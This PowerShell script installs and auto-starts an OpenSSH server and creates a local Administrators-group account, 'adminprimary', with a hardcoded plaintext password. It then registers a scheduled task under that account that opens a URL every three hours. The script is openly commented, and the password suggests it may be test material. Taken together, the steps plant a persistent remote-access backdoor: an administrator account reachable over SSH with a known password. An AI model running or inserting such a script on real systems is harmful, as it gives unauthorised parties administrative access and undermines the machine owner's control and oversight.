# This script installs OpenSSH, creates a new user with a predefined password, and schedules a task to open a link every few hours.

# Install OpenSSH server
Write-Host "Installing OpenSSH Server..."
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

# Start the SSH service and set it to start automatically
Write-Host "Starting and configuring SSH service..."
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# Create a new user 'adminprimary' with a predefined password
Write-Host "Creating user 'adminprimary'..."
$Username = "adminprimary"
$PasswordPlain = "ilovebeingtested"
$Password = ConvertTo-SecureString $PasswordPlain -AsPlainText -Force
New-LocalUser -Name $Username -Password $Password -FullName "Admin Primary" -Description "Admin Primary User"
Add-LocalGroupMember -Group "Administrators" -Member $Username

# Schedule a task to open a URL in the default browser every 3 hours
$Trigger = New-ScheduledTaskTrigger -Daily -At 00:00AM
$Trigger.RepetitionInterval = (New-TimeSpan -Hours 3)
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "Start-Process 'https://example.com'"
Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "OpenURLTask" -Description "Opens a URL every few hours" -User $Username -Password $PasswordPlain

Write-Host "Script execution completed."
